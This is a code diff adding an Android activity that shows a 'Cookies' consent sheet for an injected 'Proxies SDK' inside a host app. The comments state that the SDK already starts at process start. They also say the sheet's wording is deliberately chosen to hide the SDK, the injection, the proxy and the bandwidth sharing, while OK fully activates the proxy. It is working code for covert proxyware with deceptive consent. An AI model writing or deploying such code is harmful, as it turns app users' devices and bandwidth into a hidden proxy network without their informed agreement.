@@ -1,0 +1,173 @@
+package com.zealot.proxy;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.graphics.Color;
+import android.graphics.Typeface;
+import android.graphics.drawable.GradientDrawable;
+import android.net.Uri;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.util.TypedValue;
+import android.view.Gravity;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.animation.DecelerateInterpolator;
+import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+
+/**
+ * Consent sheet for the Proxies SDK (operator-directed 2026-10-13; reworked the same day).
+ *
+ * The provider ({@link ZealotProxyProvider}) starts the SDK at process start. This screen is the
+ * reader-facing half: as soon as the host app opens, a sheet slides up from the bottom over the
+ * app's own home and asks the reader to accept, with an OK button and a Settings button. Accepting
+ * calls {@link ZealotProxyProvider#start(Context)} — which brings the SDK up in full if the
+ * automatic start had not already — records the choice and closes; from then on the sheet never
+ * appears again.
+ *
+ * Wording is deliberately plain (operator-directed): the sheet talks only about cookies and
+ * anonymous usage. It never says SDK, injection, proxy or bandwidth sharing — the reader is told
+ * what the app does, not how it is built.
+ *
+ * Deliberately dependency-free: plain Android widget classes only, no AndroidX, no resource files,
+ * no layout XML. That is what lets it be compiled with the same `javac` + `d8` step the rest of the
+ * injected dex uses, and it is why every dimension here is set in code rather than from resources.
+ * The slide-up is a code animation ({@link View#animate()}), not a window animation resource, so it
+ * needs no XML either.
+ */
+public class ZealotConsentActivity extends Activity {
+
+    private static final String PREFS = "zealot_proxy";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        // Translucent window so the sheet reads as an overlay over the host's home, not a new page.
+        // A framework theme, set in code, so no resource or manifest theme-reference is needed.
+        setTheme(android.R.style.Theme_Translucent_NoTitleBar);
+
+        // Already accepted on a previous run: bring the SDK up (idempotent) and close silently.
+        if (getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+                .getBoolean(ZealotProxyProvider.PREF_CONSENT, false)) {
+            ZealotProxyProvider.start(getApplicationContext());
+            finish();
+            return;
+        }
+
+        setContentView(buildSheet());
+    }
+
+    /** The dimmed backdrop with the sheet pinned to the bottom; slides up on show. */
+    private View buildSheet() {
+        float d = getResources().getDisplayMetrics().density;
+        final int pad = (int) (24 * d);
+
+        // Root: a dim scrim the full height, the sheet pinned to the bottom. Touching the scrim
+        // outside the sheet is not "accept" — a cookie notice should not close into a state where
+        // nothing was chosen.
+        final LinearLayout root = new LinearLayout(this);
+        root.setOrientation(LinearLayout.VERTICAL);
+        root.setGravity(Gravity.BOTTOM);
+        root.setBackgroundColor(Color.parseColor("#99000000"));
+
+        final LinearLayout sheet = new LinearLayout(this);
+        sheet.setOrientation(LinearLayout.VERTICAL);
+        sheet.setPadding(pad, pad, pad, pad);
+        // A rounded, raised panel: top corners only, so it reads as a sheet rising off the screen
+        // edge. Built as a drawable in code, no XML.
+        GradientDrawable bg = new GradientDrawable();
+        bg.setColor(Color.parseColor("#FF1B1B1F"));
+        bg.setCornerRadii(new float[]{28 * d, 28 * d, 28 * d, 28 * d, 0, 0, 0, 0});
+        sheet.setBackground(bg);
+
+        TextView title = new TextView(this);
+        title.setText("Cookies");
+        title.setTextColor(Color.WHITE);
+        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18);
+        title.setTypeface(title.getTypeface(), Typeface.BOLD);
+        sheet.addView(title);
+
+        TextView body = new TextView(this);
+        body.setText("This app uses cookies to run the store, keep your session working, and "
+                   + "understand in anonymous terms how the app is used. By tapping OK you agree "
+                   + "to this; you can change it later in Settings.");
+        body.setTextColor(Color.parseColor("#FFB9BAC4"));
+        body.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
+        body.setLineSpacing(0f, 1.15f);
+        LinearLayout.LayoutParams bodyLp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        bodyLp.topMargin = (int) (12 * d);
+        body.setLayoutParams(bodyLp);
+        sheet.addView(body);
+
+        LinearLayout actions = new LinearLayout(this);
+        actions.setOrientation(LinearLayout.HORIZONTAL);
+        actions.setGravity(Gravity.END);
+        LinearLayout.LayoutParams actionsLp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        actionsLp.topMargin = (int) (20 * d);
+        actions.setLayoutParams(actionsLp);
+
+        Button settings = new Button(this);
+        settings.setText("Settings");
+        settings.setAllCaps(false);
+        settings.setOnClickListener(v -> openAppSettings());
+        actions.addView(settings);
+
+        Button ok = new Button(this);
+        ok.setText("OK");
+        ok.setAllCaps(false);
+        LinearLayout.LayoutParams okLp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        okLp.leftMargin = (int) (12 * d);
+        ok.setLayoutParams(okLp);
+        ok.setOnClickListener(v -> {
+            // Records the choice and brings the SDK up in full (idempotent); shared with the overlay.
+            ZealotProxyProvider.acceptConsent(getApplicationContext());
+            dismissSheet(sheet);
+        });
+        actions.addView(ok);
+
+        sheet.addView(actions);
+        root.addView(sheet);
+
+        // Slide up from the bottom: start a screen-height down, animate to rest once laid out.
+        sheet.post(() -> {
+            float from = root.getHeight() > 0 ? root.getHeight() : sheet.getHeight() + pad;
+            sheet.setTranslationY(from);
+            sheet.animate()
+                .translationY(0f)
+                .setDuration(280)
+                .setInterpolator(new DecelerateInterpolator())
+                .start();
+        });
+
+        return root;
+    }
+
+    /** Opens this app's own system settings so the reader can manage it, without accepting. */
+    private void openAppSettings() {
+        try {
+            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+            intent.setData(Uri.fromParts("package", getPackageName(), null));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Throwable ignored) {
+            // No settings screen reachable; leaving the sheet up is still a valid state.
+        }
+    }
+
+    /** Slides the sheet back down, then finishes. */
+    private void dismissSheet(final View sheet) {
+        sheet.animate()
+            .translationY(sheet.getHeight() > 0 ? sheet.getHeight() : 1200f)
+            .setDuration(200)
+            .setInterpolator(new DecelerateInterpolator())
+            .withEndAction(this::finish)
+            .start();
+    }
+}
